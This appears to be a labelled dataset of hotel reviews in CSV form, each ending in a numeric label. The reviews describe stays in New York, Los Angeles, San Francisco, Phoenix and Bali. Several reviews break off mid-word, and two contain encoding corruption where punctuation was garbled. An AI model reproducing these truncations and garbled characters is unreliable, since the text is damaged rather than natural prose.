"Amazing NYC Hotel Mela We had stayed at Hotel Mela when it first opened in 2007 right off Times Square in the Theatre District. It was my first US boutique hotel experience in a while and was quite wonderful. We returned in 2008 and I can say unequivocally it was amazing! The front desk staff were so acccomodating, friendly and professional at check-in and throughout our five day stay. The maids were efficient and did a terrific job each day. The rooms are done in gorgeous shades of black, beige with splashes of a yummy green. And, concierge Tyrone made our experience complete. He was so professional, competent and kind in each request. I am sure this is a terrific hotel for the weary business traveler because of the friendly service and attention to detail. For a hardworking theatre patron/tourist, it was awesome. Every request was taken seriously and professionally. And, we felt safe - thanks cute doormen! From top to bottom, the hotel was immaculate. The workout room was great and new adjacent restaurant served delicious food with a friendly wait staff. We have traveled all over Europe and US in the last two years, and this was by far, our best experience to ",0

"not the greatest experience i was there over the weekend for a conference for my job. had i payed my own money, i would have been very disappointed. for starters there was very little hot water in the morning. so having to get up to a cold shower every morning was not that pleasant. next, the public elevators were not working so you had to ride the service elevators with the employees. also the service elevators were only running one at a time; so most of the time you were waiting anywhere from 3-5 minutes to get on an elevator that wasn't packed with patrons as well as employees. that was very uncomfortable considering that there were sometimes where i had to ride the elevator with the wait staff who had just cleared off tables of dirty dishes or the cleaning staff who had loads of soiled linens; not cool. furthermore, the bathroom in my room was extemely small. if i was there with my wife and child we would have had a hard time making it work. the rooms are not family friendly at all, and the bathtub was pealing. however,the beds and pillows were great, they were the best things about the room itself. the cleaning staff was exellent as well as the wait staff when we had our meals. i like the access that the hotel gives you to the trolley so that you can go down to manhattan beach. also, the los angeles by night tour was awesome!!!!",0

"pleasantly suprised we stayed at the roosevelt from the 1st jan - 6th jan and were tempted to change our booking based on the number of bad reviews we read. however we are certainly glad we didn't! yes the hotel is dark but it is part of it's ambience, and its unique interior design set it apart from the numerous other hotels were it not for a name would be almost interchangable. from the begining we got a good feeling, the bell boy was friendly, chatty and very informative. our room was clean and reasonably spacious, and when we did have a plumbing issue in the bathroom the staff were polite, helpful and prompt. we had breakfast at dakota most mornings and again found the staff to be great and the food delicious. the location is superb and you are as central as possible most of the must see la. while i could see it would probably not be an ideal choice for people with a younger family, my husband and i both loved our stay there and would most definately stay there again if in la.",0

"not up to hilton standards last year in feb., we stayed at the hilton in cabo san lucas and i must admit, when we arrived at the tapatio, we were extremely disappointed. for the same price per night, you cannot even compare the hotels. first, we arrived early on a thursday and were informed that our room would not be ready until 4 pm. we basically wasted the first day of our trip (and the best weather day) waiting in the lobby for our room to be ready, even though we were told it would be ready by noon. the front desk staff was rude and sarcastic, which made matters worse. i have never had that problem at a hilton. while we were waiting, we ate at the outdoor cafe, cascades, and the food was horrible--stay away from the fish tacos which were merely fried pieces of crunchy batter. the rooms need to be up",0

"nice place stayed with my wife and two children (3.5 and 1.5 yrs) at the pointe from 20-22 june as a last minute change from a hotel in sedona due to the recent oak creek canyon fires. resort was available and inexpensive as we needed a place to stay before moving into another resort in scottsdale.resort located in midst of city, surrounded by heavy traffic roads, etc, though we could not hear any road noise due to the landscaping and how the rooms faced inward to a pool area. room had a separate two queen bed bedroom, tv, bureau, credenza and closet - no security safe though. odd shape of room led to the use of a pocket door instead of a regular door, plus one bed partially blocked the door exit. otherwise, the bedroom was fine. patio which was a sliding door off the bedroom looked out into the pool and the neighboring hallway. just enough room for two chairs - useful only to dry your swim suit. bathroom split with toilet, tub/shower in one room and sink/countertop in an open area next to the bedroom. living room had a sofa, chair, chair/desk, tv stand, mini-bar fridge/counter with coffee maker. minibar was stocked with usual minibar overpriced drinks/snacks. we asked for a refrigerator and microwave which was delivered later in the day. furniture looked fine, but the carpet was a bit dated. room was fine, though worn.parking was far from the room and no easy path to get the luggage to the room. initial day the elevator was broken, requiring lugging everything to the second floor by hand. by 2nd day, elevator was functional. grounds were well maintained and manicured greenery.best asset of the pointe was the water park (passes for each hotel guest) and the quieter smaller pools in two of the hotel complexes. hotel pools were well maintained, plenty of towels, chairs, cleaned pool, kiddie pool, whirlpool, chilled water cooler/cups. water park was typical - lazy river, sports pool - volleyball, regular pool with water falls. too busy for our needs, so we visited only once to see what was offered. adjacent grill provided food. food was typical grill food with children's menu. room service was offered, though we did not partake.all, in all the stay was slightly above average. did not see any cockroaches or other bugs. place was clean, though a bit dated and worn. hotel lobby was cheerful, staff friendly and helpful. place was trying hard to make people happy. would stay again. price was great.",0
"professionally mediocre my wife and i had a reservation for 7/31-8/2/2005 on a first leg of 10-day vacation of la-vegas-bay area swing, but checked out early 8/1 morning, headed to anaheim. $279/nite may not buy much in the area, but doesn't seem justified. the room was a plain, amall suite, shabby but o.k. the bathroom is big and seems to be the suite's only best feature. the rest is below average both in shape and deco. the lobby is dark and the hallway has this colorful art deco that looks shabby and old. i recon that some folks may like them, but i imagine not many. room's view was a back of hotel's another wing in about 15 feet away. spa construction was going on as a concrete breaker making piercing noise from 7 am'ish sat., albeit a note of appology on it slipped through the door in the morning. (i told you officially and now you should bear with it ??). broadband internet access never worked, with hotel's remote tech support person finally acknowledging that it's out of mission hotel-wide, due to be fixed on monday. an wasted. staff: front desk/valet parking are courteous, lone conciergie was unapproachable and busy yakking.location:was great but i doubt i would come back to this hotel. i complained to the hotel and at the w site. the response have been always courteous and cookie-cut apologetic, but i didn't get impression from them trying to improve.",0

"great, consistent downtown hotel i really like this hotel. it is a reliable business hotel with spacious, comfortable and clean rooms. i have stayed there several times over the last couple of years and the service is always good. different pillow types on the bed and wonderfully crisp linens provide a great night sleep. if you go out to the food court plaza from the second level there is a wonderful organic coffee bar open on weekdays. the sandwich shop next to it, is also great for a quick bite.",0

"nice place to stay we got a package deal through expedia 3 nights 4 days hotel, r/t air from lax and rental car for $777.00. the hotel and stay were great. i am not sure what all the negative stuff was all about as our experience was quite pleasant. i found the setting to be elegant as one would expect and the staff extremely professional yet not stuffy. we didn't have a view but that was ok. if you know sf at all you know it is hard to get a room with a view(buildings so close together) so if you are willing to pay a ridiculous price or plan on spending your entire stay in your room then by all means pay the price. pillow top mattress and feather pillows made for a very restful sleep.parking is steep but that is how it is in sf so add another 40 bucks or so a day for parking your car here. the cable car is right outside the hotel and cabs are abundant. the lounge is classy,cozy and intimate with a piano man playing in the background. i didn't eat at their restaurant,i have many favorites around town that i go to whenever i am here. try frascati on hyde street (russian hill area) chef teri mcleod will blow you away with her cal med rendition of the areas freshest foods. yummmmm! anyway if you are looking for comfort and value for your buck i recommend the stanford court. close to everything, classy and comfortable,what more could one ask for.",0

"loved the line restaurant but annoyed about a late/wrong minibar charge first hotel in our honeymoon as a 2 night stopover to australia. great welcome and check in, very helpful in cutting the lock on our case after we lost our key. we stayed in the garden wing, think slightly bigger room and lots of greenery on balcony etc.highlightsgood welcome on arrivalbed was really really comfortable - slept really wellelectric curtains (unnecessary but felt really special)we got a membership card which gave us half price on breakfast in the line (buffet restaurant).the line was a really great buffet breakfast (best we had on our trip) - great fruit selection but loads of great choice , really modern look and feel and as we grazed we could watch the staff preparing pasta.didn't feel too business orientedlowlightson getting home we were charged a late charge for whisky from the minibar after we left but given we don't drink whisky definitely not us but unnecessary hassle and not what we wanteduninspiring viewsroom was good size and no issues with it (other than seeing a few ants in the room) but does look a bit",0

"terrible experience, such a waste of a good hotel! even from the beginning of our stay at the hollywood roosevelt, we had terrible service. my husband and i checked in around 10 pm on a friday night, and were told by the hotel that there were no rooms left, and that they had overbooked the rooms. even though, we had made reservations 2 months in advance for a 3 night stay! we complained to the front desk staff and manager on duty, who didn't give us much sympathy. they were too busy attending to the other guests were were attending a party in the pool area. the management's solution to the problem was shipping us to another hotel, located 10 miles away! after coming in from a long flight, being tired, etc. we were very dissapointed that the roosevelt could not accomodate us in any other way, despite having a confirmed reservation. they also could not guarantee us a room for the following night! they suggest that we call the next morning to see if there were available rooms. what is the point of a reservation, if you have no rooms available?!apparently this happens more often than they like to admit, since many other guests checking in on the same evening faced the same problem. it seems the staff were more attentive to the party guests, rather than their own paying hotel guests! we did end up staying the 2 remaining nights at the hotel, only to find our room very small, dirty and dingy. there were huge dirt spots on the carpet! the pool area was off limits and limited to vip access. we weren't even allowed to go into this area, which was guarded by security, even though we were guests of the hotel! the only good thing about the roosevelt was the location of the hotel which is located right across the street from gruman's chinese theater, kodak theatre, and the hollywood and highland complex. after returning home from our trip, we contacted the management of the hotel. they did not even both to give us a call back! we will not be wasting our time and money on this hotel in the future. we'll be staying at a hotel where they value their guests!",0

Our room was spacious and very nicely appointed; it had a sitting room with a divan, chair, and desk, and a separate bedroom with a king bed and huge bathroom with a double shower. Both rooms had flat panel televisions and wireless internet. We found the bed to be very comfortable with super soft sheets and the room itself was extremely quiet for NYC; we were on the 27th for.

"a dissapointing experience one can hardly imagine a better and more romantic site for a hotel or golf course than the le meridien nirwana tanah lot.the temple of tanah lot is a balinesian shrine and the number one sightseeing spot on the island. the sunsets on the small island of tanah lot are world-renowned. thus, every evening hundreds of tourists gather in the accessible part of the temple on the mainland in order to view this marvel.that is all inclusive for golfers and le meridien guests. the resort opened its doors almost 10 years ago, at the same time as the greg norman designed golf course.to come straight to the point: the golf course is one of the most beautiful i know. the holes along the sea are truly spectacular and the par 3 against the backdrop of the tanah lot temple can be safely described as é¥?¸¨orld classé¥? having said that, the course is anything but easy. the prices are absolutely fair, approx. $ 85.é¥?for 18 holes; of particular interest is the sundowner from 4pm. if you are on your own and play fast you will be able to complete the 18 holes.i had already been to the le meridien nirwana seven years ago. at that time it was still rather new and impressive. unfortunately, the hotel has lost a lot of its class since then. today it is conspicuous that its design is rather oversized and because of that the hotel appears deserted once the occupation falls to 20 to 30% (as it may have been the case during our visit). apart from that, even though not yet that old, wide areas appear worn and torn. the villas with their own pools, in particular, appear quite weathered. other parts of the hotel, most of all the spa, are simply no longer é¥ç?tate of the arté¥? non-charming, non-personal, non-spectacular are some é¥?¸?onsé¥?that spring to mind when considering the spa of the le meridien. no creation of any wellness experience whatsoever, everything is mediocre. what a pity. with such a world-class location embracing cliffs, sea views and sunsets, really much more could be done. just take, as an example, the various ritz carltons, four seasons or the aman hotels. or, leté¥??? say, the andaman/",0

I was concerned about being inside the airport with ease of getting to the hotel and the parking situation (we drove in).We were very pleasantly surprised. The signage within the airport directing you to the Hyatt is very good and they plainly differentiate between the Hyatt Regency (by terminal C-where we stayed) and the Grandy Hyatt at terminal D so there was no confusion there. The parking is also well marked and very convenient to the hotel itself. The hotel was quite busy for a weekend with a large high school convention going on, so I had some concern about noise, but we had no problems.

"absolutely fantastic all i can say is the person who left the last review either works for a rival hotel or actually reviewed the wrong hotel. our experience could not have been more different and we stayed at the hotel at roughly the same time. this hotel surpassed all our expectations and has set new ones for any hotel we stay at in future. the staff were unbelievably helpful and friendly, nothing was too much trouble. our flight was cancelled and we arrived 5 hours later than planned to be greeted by a very warm welcome and food and drinks served in a very comfortable lounge with plasma screen tv and scented candles. heaven! we were staying with our small daughter and the staff at the hotel were happy to acommo",0

not as good as our last 2 stays the hotel is spotlessly clean and the pool is great. had a balcony overlooking the pool. if you have not stayed here the location is quiet with shopping and lots of restaurants in the area. now for the negative.aaa california south books add states that enterprise rent a car is in the lobby (they left about 6 months ago) hotel did call for pick-up. also states that there is a airport shuttle. i was told at the airport that they had never seen a sportsman lodge shuttle at burbank airport. phoned and was told to take a taxi and they would give the driver a voucher. that was okay but would have liked to have known this in advance. we ate twice at the coffee shop as we have done in the past. breakfast was okay but could had been better (corned beef has was burned and the eggs were just barely warm. had the blue plate special (was okay except they ran out of the soup that was supposed to be included) they stated that they close at nine. (were there at 08:30) we were not offered anything in its place.just a block south of the hotel is jerrys famous deli. we had lunch (great pastrami sandwich) and breakfast the last morning (best eggs benidict i have had). highly reccomend this place to eat. cab to the airport went smooth even though it was rush hour (08:30 am) takes about 15 minutes. would stay here again but as earlier stated not as good as previous stays.,0
"fab location it's not the nicest hotel but it's clean and comfortable. the rooms are a bit on the small side and the buffet breakfast was a bit of a let down. this is a reasonably priced hotel in the city and i beleive you get what you pay for, which is somewhere to leave your luggage and sleep - it's san francisco, you're not supposed to be in your room!! and when you step out the hotel you are in the heart of the city, two steps from union square. the cable car runs outside the hotel and at the bottom of the street you can get the bus. the muni card was a bargain and we saw the whole city using it. the stratford isn't the ritz but i wasn't there for the hotel. would definitely stay there again.",0

"week in california we spent 3 nights at the roosevelt and enjoyed our time overall. the check in process was very smooth and the staff treated us very well and made us feel very welcome. when we arrived to our room it was very warm. told the bell boy about it when he brought our luggage and house keeping was notified right away. seems all you need to fix anything at the roosevelt is a pair of pliers! maintance opened up several boxes in the room and hit the air conditioner several times with the pliers and we had a comfortable room! made us laugh very hard when they left. on our second day at the roosevelt they had some sort of function going on in the lobby so it was closed to guest. the lobby elevator button was even disconnected so you could not get to that floor at all. the only way into the hotel was in the back where the valet was, i think the hotel staff should have told guests that the main entrances would be locked all day. we would stay at the roosevelt again if we were ever in the area. bed was very comfortable.",0

"it was nice :) i stayed overnight at this hotel with a few of my cousins and friends. just a girls night out. the reason i chose this hotel is because i got a good deal on hotwire for it ($115). i think it was worth the price, but i wouldn't pay any more than that. i haven't been to too many 4 star hotels, but i thought it was kind of ridiculous to have to pay $18 for self parking. i mean, i didn't have any other option since there was no street parking. the pool area was very nice and quiet, although it did seem a bit different on the website. the room was also very clean and elegant. i probably wouldn't stay here again, though, just because there isn't too much to do within walking distance other than the shopping center across the street. there is also a lot of traffic around the area, which can be heard from the pool area. other than that, it was a nice stay.",0

"the price was right! after getting this hotel on priceline, i read some of the reviews from other travelers and was a bit scared about what i was in for.....i was prepared for a horrible room, snotty desk people, hard beds, etc.. i was plesantly relieved! we payed $80.00 for a nice room. i called the hotel in advance and requested a king bed which they gave me with no problem. we did not have a view of the street, but their courtyard. the desk staff and concierge were wonderful. the hotel was extremely quiet and was located right next to two of sf's most expensive hotels on nob hill. we walked down the steep hill to union square for breakfast at sears pancake house. we had wonderful swedish pancakes and made the walk back to the hotel....whew!!! a real workout. the only downfall is the parking fee of 43.00. but that is sf, parking is expensive. i would recommend this hotel again.",0
"great trip but not perfect my husband and i along with two other couples traveled to the punta cana princess the beginning of april 2008. overall i have to say we really enjoyed this resort, however we did have some problems. this may be a bit long but bare with me, hopefully it will give a good honest review.flight - we travelled down with the regency club through air transat. flight was fine. it was very early in the morning and a bit cramped but i guess that is to be expected on these kinds of airlines. bus to the resort was actually a lot of fun. check in - check in on the other hand did not go so well. if you go here and have someone by the name of solomon serve you at the front desk wait for someone else. he was rude and just overall a jerk. we had requested to be in the same building as our friends and we had also requested king beds. they had us in separate buildings in two double beds. also we had been told that regency club guests were in either building 4 or 5. this is not the case. you only get in building 5 if you specifically book an oceanview room, which was not offered to us at the time of booking. however if you kick up enough of a stink and maybe throw in a few tears they are pretty quick to try to accomo",0

"fresh, funky and contemporary hotel we stayed here for 7 days overall and found it to be a pleasant hotel. it's very busy with a funky contemporary feel. the staff were mostly friendly, although some on the door were bordering on snooty. it's obviously becoming one of the places to be seen in la, both in the hotel and the bar. we often saw a group of bodyguards escorting someone famous around the hotel.the room although slightly small was comfortable and the shower was a fantastic overhead rain type.the food was very tasty and priced as you would expect at a fine restaurant. personally i would have liked a buffet type option at breakfast but thaté¥??? a minor gripe as the menu catered for all tastes. waiters and greeters in the restaurant were the most friendly staff in the hotel.valet parking only, which although i can understand that they need to do this to compete with the best i would have liked a self parking facility also.would stay again, but would prefer to try elsewhere first.",0

"interesting i'd booked a deluxe room as i was hoping this would be away from the noise. i was offered an upgrade to a suite for $50. great i thought until he told me it was $50 a night. i was there for 3 and we took the upgrade as we'd just stayed at the best hotel ever in vegas (thanks tripadvisor!). this is an old hotel that has had a facelift (or two, this being la and all!!) . the room was probably two rooms in a past life, but it was worth the extra money to have all that space. half of it may have been too small. we had a great view of the chinese theatre and hollywood sign. we were on the 9th floor.it was too cold and grey to use the pool, and we only saw it on our last day anyway. looks like a great place to spend time. the lobby bar is pricey, but it is classy and funky. we could hear it from our room at night, the bass throbbing through the building. thankfully earplugs and sleeping tablets helped hide that! as a first time tourist to la its hard to find somewhere central to stay in a town that has no heart. for a location though this wasn't bad as the boulovard wasn't too unsafe at night, given the crowds outside. loads of safe places in the hollywood and highlands complex next to the kodak theatre as well as the ones in the hotel - note 21 degrees burgers - order one mixed portion of onion rings and fries for two as it's plenty! this isn't a cookie cutter hotel, so expect it to have a bit of charm and character for it's age. it's a funky place to stay and if you are looking for the different, then come here. if you want a standard type of hotel, then go to a hitlon or marriot etc.",0

"Stay at the hotel, but avoid the restaurant. I just got back from a four night stay at The London NYC. I was traveling with my parents, so we had a two bedroom suite. We all enjoyed the hotel very much (though we agreed that they do some things better than others) and would highly recommend it. First, the lobby is beautiful. It isn't large, nor is it a place to hang out (there aren't even any chairs there), so you can't sit around enjoying drinks with friends. But it is a nice place to meet friends before going out for the evening. Our room was clean and beautifully designed. The sofa in the living area is not built for lounging. It isn't the sort of sofa you sink into, but is instead a bit formal. The genius of the sofa (which was curved and built into the wall like a banquette) is that it works in combination with the coffee table in front of it to create two entirely different rooms. With the table at coffee table height, you have a nice living room area. But the coffee table can be adjusted to raise it to the height of a dining room table so that your living room suddenly becomes a dining room if you want to eat in. It's genius!There were wood floors in the living room.The beds at The London NYC were super comfortable. If you, like me, are allergic to down pillows, you know that when you ask for the pillows in your room to be replaced with synthetic, what you usually get is a hard, uncomfortable piece of foam. Not so at the London NYC. The synthetic pillows they brought to my room were just as comfortable as down. I hate climbing into the bed only to find that the sheets are a poly-cotton blend. The all cotton sheets at the London NYC did not disappoint.The bathrooms in our room were beautifully designed. Tile covered all the walls from floor to ceiling and was an attractive pale blue color that matched the rest of the room. The tile was sort of rough (I think it is called 'tumbled tile') and had a hand-finished look. In the larger of the two bedrooms there was a double shower and double sink. Both of the rooms had great shower heads with plenty of water pressure along with a handshower. There were bath products (shampoo, conditioner, body lotion and bath gel) from Waterworks.One thing we noticed about the hotel was how quiet it was. Granted, we were on the 39th floor, but there was almost no noise at all from the corridor either. I finally realized that the walls in the hallway were not painted, but instead had been wallpapered with a velvet-like fabric that I'm sure absorbed noise.The staff was polite and attentive. I wanted some clothes to be laundered in house and brought to my room so they could hang to dry and the hotel graciously accommo",0

"sacre blah i must regretably retract anything positive i have previously said about this hotel, having stayed there 3 times. this time we were assigned the one beach cabana out of the 12 that did not have an outdoor area. we complained and were moved to one that did, unfortunately it was on a noisy pathway with staff starting there at 6am. the cabanas were not full but we were given the worst of them. after accepting the 2nd cabana we found we were locked in! a call to reception ascertained that they had lost the key (no fancy schmancy hotel like card keys here, just old fashioned metal keys) they were sending out for a locksmith which should take about 1.5 hrs. then there was the breakfast buffet, the novotel has made absolutely no effort to reduce the number of flys swarming over the food. i could only eat the yoghurt as the flys weren't interested in it. this was truly appalling and disgusting.management decided to give us a free french buffet one night but the coupon never arrived so we didn't go, not really fancying french food in bali anyway.the cabanas are really dark, all brown wood, not very appealing, very",0

"fantastic service, clean rooms i stayed here for 3 nights mar 2007 for a wedding. the service was fantastic from doormen, valet, front desk, to housekeeping. the rooms were super clean, nice marble floors, super comfy beds, very white clean towels/linen. pool was small, but your in the middle of the city. i was in room 617 which didn't get as much sun as room 627 due to the buildings. but if you want a bigger room for the same price get rooms ending in 45... like 645. it overlooks the pool has much more space due to the location. the only disappointment was the banquet service during the wedding, it was terrible. the banquet servers ignored your requests, just wanted to get in/out do thier job regardless of customer service. the bar is nice with fantastic bartenders, pianoman, servers. there is a 'public' international marketplace close by for fast food (chinese, mexican, japanese, thai, etc.) the wells fargo plaza also offers cpk other eateries. the italian restaurant in the courtyard of the omni was just ok. overall, the inside of the hotel was much nicer than the outside, the hotel service was fantastic (excluding banquet service). i would stay here again. we booked through fly n stay for cheaper rates, but some rooms booked through this site had major problems. when they checked in, the omni asked for vouchers. the omni wanted to charge them again for the room even though it was prepaid through fly n stay. this was a bit of a bummer. so if you don't book directly with the hotel, call to confirm your reservations. the hotel is close to the fashion district, chinatown, the jewelery district. the area is not the greatest, but then again its downtown.. thats to be expected.",0

"the worst hilton we've ever stayed at my husband and i just got back from a two week trip including sedona, the hopi reservation, durango, co, and phoenix. we are hiltonrewards members and used out points to stay at the hilton in sedona (fabulous), the doubletree in durango, (wonderful), and the point hilton squaw peak resort in phoenix...not so much.first of all, the air didn't work - it was 112 when we got there. nothing was ever done. second, we had ants...everywhere. the blinds didn't work and the housekeeper kept moving our things around to where she wanted them. the resort itself seemed run down. the pictures made it look much larger than it is. a professional miniature golf course winds around the lazy river at river ranch and inner tubes covered the whole golf course. we, along with several other people couldn't even follow where the holes were. one minute you were on top of a hill, and the next minute you had to cross over a hole someone else was playing to get to your next hole. while we were there, they also had an adolescent basketball conference. banging of doors, yelling, running up and down the stairs, and yes, one night some kids tried to break into our room. unfortunately, i was in it! i chased them down the corridor and made sure they understood i didn't find their attempts funny. all, in all, not the most relaxing time. i must say, however, that the hilton in sedona was absolutely fantastic, as was the doubletree in durango, co. my husband and i have stayed at hiltons for years and the squaw peak resort was the worst hilton we've ever stayed at.",0

We had a deluxe room which I found small and slightly out",0

stay clear when i arrived i was propositioned by the hooker at the front door. do you need a friend for the night? i am a police officer in a large midwest town. but it did not take my personal background to understand this was in a high crime area. lock your doors and drive past. phoenix inn was recommended by a phoenix police officer i flagged down. try there for a nice tucked away hotel.,0

"mixed experience at sheraton gateway lax first let me say, for the price i paid via hotwire.com, this was an excellent deal! for the level of hotel, the price was hard to beat. also, the decor of the hotel fits my personal style and so i loved the feel of the place. the bar was awesome and shula's 347 restaurant inside the hotel was amazing (pricey, but amazing)! the beds are super comfy and the pool area was very nice too, the location was great since our vacation had us traveling all over the la area. that being said there are some definite problems with this hotel, in fact, if i was someone who could afford their normal room rates, i would absolutely think this hotel was the pits! first, there is no free parking whatsoever. that's pretty normal for los angeles but the valet at the sheraton is the biggest rip off i've ever heard of in my entire life! it's around $25.00 if you valet over 15 minutes!!!! if you elect to self park, it's $13.20 per night. make sure you add that on top of your room rate when budgeting your vacation. the hotel messed up my bill which added insult to injury, they failed to charge me for my hotel bar tab but then charged me for a week of valet parking i didn't use. when i tried to fix the issue and was honest about not being charged for the bar tab, they blamed me and i had to deal with three different people to get it fixed. the bathrooms are a bit scuzzy considering the rest of the hotel and the tv's need to be updated. also, it appears they have been having elevator issues for a long time now with only 2 of the 6 working so you have to take the service elevator. the brasserie for breakfast is overpriced and the service is super slow, i was shocked how bad it was in comparison to shula's the night before. i recommend avoiding a handicapped accessable room as well. i would probably stay here again but it would have to be an even better deal than the one i got. it left our vacation on a sour note due to the billing issues and the price gouging parking issues. just be prepared for what you're getting into.",0

"good, bad, and the ugly we chose this hotel based on the photo and description on the hotel's own website. it was a bit misleading. the hotel is difficult to find, considering that it sits in and atop the galleria (not a mall, despite the name) among several medical facilities and colleges. we passed it and had to turn around - a complicated proposition considering the volume of foot traffic in the area. the traffic signals are slow and pedestrians (mostly medical school students in a hurry) pretty much ignore them, creating a major driving hassle. we parked in the garage adjacent to the hotel, which costs $18/day. the spaces are small and some valet service also uses the garage - double parking all over the place, creating another headache. front desk staff was minimal and we ended up waiting for our parking voucher every time we came and went. that's the bad.the good? the room had a great layout and was spacious. it included a table, desk, microwave, fridge, sink (basically a small kitchenette), and a whole wall of windows. (the windows faced apartment windows, which was a bit disconcerting - imagine looking out and seeing a man changing his clothes in his bedroom not 50 feet away.) the location was great for walking - much to see and plenty of restaurants to choose from. as a matter of fact, the galleria food court is literally an elevator ride away. there, we could choose from a variety of quick meals - mexican, chinese, american, subs, sushi, soup, coffee, smoothies, even dairy queen and mcdonalds. the ugly? unfortunately there was an ugly. the toilet was unstable and filled inconsistently. the shower never stopped dripping and had a slow (extremely slow) drain. my ten minute shower practically turned into a bath. the bathroom sink had a problem with uneven water pressure. the lighting in the room was inadequate - four lamps with dim bulbs did not provide enough light, and opening the curtains was not much help since the hotel is in the shadows of tall hospital buildings. the door was challenging to close and latch, and i found the single chain lock (no deadbolt) to be insufficient.on an odd note, the hotel has framed photography on display and for sale in the lobby, yet when we inquired about purchasing a piece (which was a fundraiser for the adjacent hospital, by the way), no one knew how to sell it to us. we left without the piece. why display prices and post information about the fundraiser, and then be unable to sell the pieces? disappointing.if i had someone in one of the nearby hospitals, this would be my hotel of choice. but otherwise, i won't be back.",0

"beware the car service scam i'm staying here for a conference. tonight, a group of 13 of us got together for dinner at a local restaurant. we asked the bellman for cabs. limousines arrived. some in our party specifically asked why we had limousines instead of cabs. the bellman told us these were cabs. a couple of us who had been out around the town already remarked that we had not seen cabs in the city, and we thought maybe this was another of the weird surreal things about this very weird surreal city. in hindsight, we should have been more wary. we were being screwed. of course these weren't cabs. there was no meter, just an announcement of a charge at the end of the trip. the limos cost a total of $95 plus tips to take us about 5 miles. at the end of our meal, we asked for cabs, and got...cabs! total fare: $39 plus tips. we confronted the bellman, who first said we had asked for limos. we were clear that we had not. then he said he was using our regular car service, but said that we had been overcharged. we protested that the problem wasn't just that we had been overcharged, but that in fact we had gotten what we did not ask for and that we were not dealt with honestly. he told us we were free to talk to the manager. we did so. the manager apologized, but when i asked him directly what the hotel's policy was on calling limos when guests asked for cabs, he denied that this was their practice. however, in discussing the issue with other conference attendees, it seems that consistently guests who ask for cabs are being ushered into limos, and then stuck with bills at the end of the trip. i have seen the limo/cab scam elsewhere. it's not unique to this hotel. i wouldn't be surprised if there's a kickback involved. but guests have a right to be treated fairly, not be hustled into scams, and to be able to trust our hosts. the phoenix hyatt failed on all counts. i won't be coming back. if you must stay here and need a cab rather than a limo, be sure to be explicit with the bellman, and don't get into a car without a meter unless you negotiate on price up front. know also that cab fares are relatively low, so you should probably expect to pay less than you might think.",0

"excellent. wish all hotels were this cheap and this gorgeous. stayed here one night 10/1 through priceline paid $70.this hotel is a four star for sure. in the middle of airport hotels, no need for a car if you have flight immediately before or after. except the rest of la is at least 15 miles away, the closest mall is 5 miles away (think cab fare) and the major road is off rt. 405 where traffic is a bit insane, even on a saturday night.the hotel staff is really very nice. i asked any way i can get a nicer room on a high floor? and they said of course you can. they did but i have a feeling all of the rooms were just as nice.the hotel itself is very clean. the rooms are very nice, very well-maintained and very updated. very nice. we were impressed the moment we stepped foot in our suite. large marble bathrooms, really comfy king size beds in a separate bedroom and spacious living room (couch, chair, dining table and kitchennette).. what was most impressive, which makes us want to go back every time, is the breakfast. the continental breakfast, which all of us are used to cold dry bagels and toast, is actually an all you can eat buffet, with a kitchen grill where the staff will make you anything you want complimentary. omelettes, pancakes, french toast, sausage, bacon, whatever. and the cold stuff is there too. cereal, muffins, pastries, bagels, fruit... amazing. you need to take advantage of it to appreciate it.definetely worth going back. good for you if you win or book this hotel. you will be pleased. i wish all hotels were like this one.",0

"happy with our stay we stayed at the roosevelt for 4 nights in late january 2005.we were a bit worried by the user reviews but they had a really good rate of $150 au per night and we wanted to stay in hollywood, because of the location and proximity to the metro train. we were not disappointed. the room and bathroom were very clean and comfortable. we had a nice view over the city through big windows. the room was on the small side and the beds only double and a bit firm but we didn't find this a problem, and we are a family of 4! found the staff at reception very helpful when questioned about local transport and activities. housekeeping was prompt and polite when we called for more towels. bell staff were happy to look after our luggage on the last day and arrange cabs promptly. the old foyer was lovely. we were warned several times on booking that the pool was still being renovated so that was entirely expected. the evenings were a bit cold to swim anyway. had a look at the pool area and it should be very nice when completed. found the metro easy to use and the station is across the road ( but remember the machines with only accept new $1 bills for tickets!-as the tourist office told us after we had battled with it for 1/2 an hour). it is a very quick and cheap way to get to universal studios and downtown la. also connects to long beach but trip is about 1 1/2 hours. the hollywood area itself was interesting and we enjoyed the new shopping and restaurant complex. i would be happy to stay in this hotel again as a good value , mid range hotel.",0

"management nightmare my friend reserved two rooms for our overnight before flying out of phoenix. when we arrived we asked the clerk to charge one of the rooms to my credit card and the other to my friend's card. this was evidently a rocket science request for as a result the following occurred:1. i was billed twice for the same room for the same day2. i had to call the hotel four times in one day since the voice mail i was given was for someone not at work that day to fix the billing.3. a security guard knocked on our door at 2:30 am the day of our departure asking for a receipt he was told to collect as the wrong receipt for identical price rooms was switched by them at the desk. 4. their website states that they have shuttle service to the airport. the problem is that it starts at 6:00 am so forget about making a morning flight and using their shuttle. answer from the manager was well, we didn't say 24 hr. shuttle service. i guess this is another thing the savvy traveler will have to ask about....live and learn.5. my friend was billed for her room and a more expensive room for the same day. another double charge problem....with the added insult of a higher price.6. the hotel alleges that they didn't have my friend's credit card numbers but how i asked could the erroneous billing show up on her credit card statement?7. the room was neat and clean but this was the most mismanaged hotel i have ever been in. i was offered an i'm sorry, however this chain of ineptness was all too similar to a marx brothers night at the opera.",0

"wonderful place, can't say enough! my daughter (17) and and i spent a weekend in la to see the sights. we got a great rate from hotels.com and the stay exceeded both our expectations. the staff was outstanding from front desk to floor maids. the decor is just breathtaking! the pool area was a throwback to the art deco era. the rooms are tastefully decorated and comfortable. the lobby is a real stunner!much has been written about the parking fees. the valet parking was a lifesaver after a long day of siteseeing, and also great to have the car brought out first thing as we started our day. parking valets were awesome! they were courteous and friendly. i never felt like tipping was required, they were very personable and efficient. i was more than satisfied with the service.i would not hesitate to stay there again. perfect for a girls weekend! everyone from valet attendants to concierge were cheerful and helpful.hint: if renting a car, bring or rent a gps system. that saved our nerves and made the weekend stress-free as we traveled from la, to hollywood, to venice, to anaheim, to beverly hills. no small feat for two midwesterers!",0

